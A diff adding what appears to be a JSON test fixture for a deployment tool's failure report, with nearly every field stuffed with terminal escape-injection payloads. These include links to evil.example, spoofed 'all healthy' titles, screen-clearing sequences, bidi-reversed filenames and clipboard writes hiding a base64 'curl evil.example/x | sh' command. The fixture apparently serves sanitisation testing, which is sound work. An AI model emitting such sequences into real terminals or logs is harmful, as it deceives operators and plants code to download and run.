@@ -1,0 +1,62 @@
+{
+ "version": "v7",
+ "status": "failed",
+ "deployed_by": "ci:\u001b]8;;https://evil.example/login\u001b\\motel login\u001b]8;;\u001b\\ [:::https://evil.example/tag]motel login[:::-] [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-]",
+ "sha256": "22a706ae67234e9fce89f07dead8e03e2c9d2e3a3eafa30c86fae1508074a672",
+ "started_at": "@-4220s",
+ "finished_at": "@-70m",
+ "phase": "starting",
+ "artifact_entries": 1842,
+ "artifact_bytes": 39845888,
+ "phases": [
+  {
+   "name": "downloading",
+   "started_at": "@-4220s",
+   "seconds": 1.2
+  },
+  {
+   "name": "extracting",
+   "started_at": "@-4218s",
+   "seconds": 0.8
+  },
+  {
+   "name": "preparing",
+   "started_at": "@-4218s",
+   "seconds": 4.1
+  },
+  {
+   "name": "starting",
+   "started_at": "@-4213s",
+   "seconds": 1.0
+  }
+ ],
+ "error": "start failed: \u001b[2J\u001b[H\u001b]0;motel: all healthy\u0007probe 500 [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-] \u202elmth.exe\u202c",
+ "detail": {
+  "exit": "exit status 3 \u009b31m",
+  "probe": {
+   "status": 500,
+   "location": "/login\u001b[5A\u001b[2K\u001b[10C[:::https://evil.example/tag]motel login[:::-]",
+   "body": "<h1>no such table</h1>\u001b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\u0007 [:::https://evil.example/tag]motel login[:::-] [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-]\nsecond line \u001bPtmux;\u001b\u001b]52;c;Y3VybA==\u0007\u001b\\"
+  },
+  "log_tail": [
+   "normal line before the attack",
+   "apc \u001b_Gf=100,a=T;AAAA\u001b\\ end",
+   "bidi \u202elmth.exe\u202c end",
+   "c1 \u009b31m end",
+   "clear \u001b[2J\u001b[H end",
+   "csi \u001b[5A\u001b[2K\u001b[10C end",
+   "dcs \u001bPtmux;\u001b\u001b]52;c;Y3VybA==\u0007\u001b\\ end",
+   "osc52 \u001b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\u0007 end",
+   "osc8 \u001b]8;;https://evil.example/login\u001b\\motel login\u001b]8;;\u001b\\ end",
+   "tags [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-] end",
+   "title \u001b]0;motel: all healthy\u0007 end",
+   "urltag [:::https://evil.example/tag]motel login[:::-] end",
+   "multi\nline\r\nfield"
+  ],
+  "log_tail_truncated": true
+ },
+ "note": "note [:::https://evil.example/tag]motel login[:::-] \u001b[5A\u001b[2K\u001b[10C",
+ "redacted_env": [
+  "SECRET[:::https://evil.example/tag]motel login[:::-]"
+ ]
+}
